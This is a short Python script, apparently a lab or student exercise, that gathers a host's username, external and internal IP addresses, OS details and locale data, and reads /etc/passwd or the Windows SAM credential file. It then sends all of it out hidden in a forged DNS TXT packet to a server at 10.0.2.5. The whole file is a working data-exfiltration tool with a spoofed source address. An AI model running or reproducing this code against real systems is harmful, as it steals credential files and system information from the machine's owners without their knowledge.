import locale
import sys
import os
import platform
import getpass
from requests import get
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import UDP, IP

DNS_port = 53
DNS_server_ip = "10.0.2.5"


def get_os_info():
    os_name = os.name
    os_version = os.uname().release
    os_info = f"{os_name} {os_version}"
    return os_info


def exe_file():
    username = getpass.getuser()

    if os.name == 'nt':
        fp = open("C:\\Windows\\System32\\config\\sam", "rb")
        password_file = fp.read()
        password_file.decode("utf-8", "ignore")

    else:
        fp = open("/etc/passwd", "r")
        password_file = fp.read()

    fp.close()

    ip = get("https://api.ipify.org").text
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_internal = s.getsockname()[0]
    s.close()

    print("Building data packet to send to DNS server")

    passwords = str(password_file)
    os_info = get_os_info()
    print(os_info)

    data_to_send = "username: " + username + "\n" \
                   + "\n" + "external ip address: " + ip \
                   + "\n" + "internal ip address: " + ip_internal \
                   + "\n" + "Password file data:\n\n" + passwords \
                   + "\n" + "Languages: " + str(locale.locale_alias) \
                   + "\n" + "operating system: " + get_os_info()

    print("Sending data packet to DNS server")

    dns_layer = DNS(id=1234, qr=0, qd=DNSQR(qname="example.com"))
    dnsRR = DNSRR(rrname="example.com", type="TXT", rdata=data_to_send)
    udp_layer = UDP(sport=RandShort(), dport=53)
    ip_layer = IP(src="1.2.3.4", dst=DNS_server_ip)

    packet_to_send = ip_layer / udp_layer / dns_layer / dnsRR / data_to_send
    send(packet_to_send)

    print("Data packet sent to DNS server")


if __name__ == "__main__":
    exe_file()
